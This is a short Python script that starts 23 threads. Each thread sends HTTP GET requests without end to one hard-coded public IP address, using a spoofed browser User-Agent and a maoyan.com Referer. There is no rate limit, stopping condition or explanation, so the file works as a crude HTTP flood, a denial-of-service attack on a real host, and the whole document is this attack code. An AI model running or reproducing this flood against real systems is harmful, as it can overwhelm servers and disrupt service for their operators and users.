import time
import threading
import requests

url = 'http://119.28.140.189/'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 FS',
    'Referer': 'https://maoyan.com/board'
}
def conn_thread():
  cont = 0
  while True:
    cont+=1
    print(cont)
    a = requests.get(url=url, headers=headers)
    d = requests.get(url=url, headers=headers)
    e = requests.get(url=url, headers=headers)
    f = requests.get(url=url, headers=headers)
    g = requests.get(url=url, headers=headers)
    h = requests.get(url=url, headers=headers)
    i = requests.get(url=url, headers=headers)
    j = requests.get(url=url, headers=headers)


conn_th1=threading.Thread(target=conn_thread,args=())
conn_th2=threading.Thread(target=conn_thread,args=())
conn_th3=threading.Thread(target=conn_thread,args=())
conn_th4=threading.Thread(target=conn_thread,args=())
conn_th5=threading.Thread(target=conn_thread,args=())
conn_th6=threading.Thread(target=conn_thread,args=())
conn_th7=threading.Thread(target=conn_thread,args=())
conn_th8=threading.Thread(target=conn_thread,args=())
conn_th9=threading.Thread(target=conn_thread,args=())
conn_th12=threading.Thread(target=conn_thread,args=())
conn_th13=threading.Thread(target=conn_thread,args=())
conn_th14=threading.Thread(target=conn_thread,args=())
conn_th15=threading.Thread(target=conn_thread,args=())
conn_th16=threading.Thread(target=conn_thread,args=())
conn_th17=threading.Thread(target=conn_thread,args=())
conn_th18=threading.Thread(target=conn_thread,args=())
conn_th19=threading.Thread(target=conn_thread,args=())
conn_th20=threading.Thread(target=conn_thread,args=())
conn_th21=threading.Thread(target=conn_thread,args=())
conn_th22=threading.Thread(target=conn_thread,args=())
conn_th23=threading.Thread(target=conn_thread,args=())
conn_th24=threading.Thread(target=conn_thread,args=())
conn_th25=threading.Thread(target=conn_thread,args=())


conn_th1.start()
conn_th2.start()
conn_th3.start()
conn_th4.start()
conn_th5.start()
conn_th6.start()
conn_th7.start()
conn_th8.start()
conn_th9.start()
conn_th12.start()
conn_th13.start()
conn_th14.start()
conn_th15.start()
conn_th16.start()
conn_th17.start()
conn_th18.start()
conn_th19.start()
conn_th20.start()
conn_th21.start()
conn_th22.start()
conn_th23.start()
conn_th24.start()
conn_th25.start()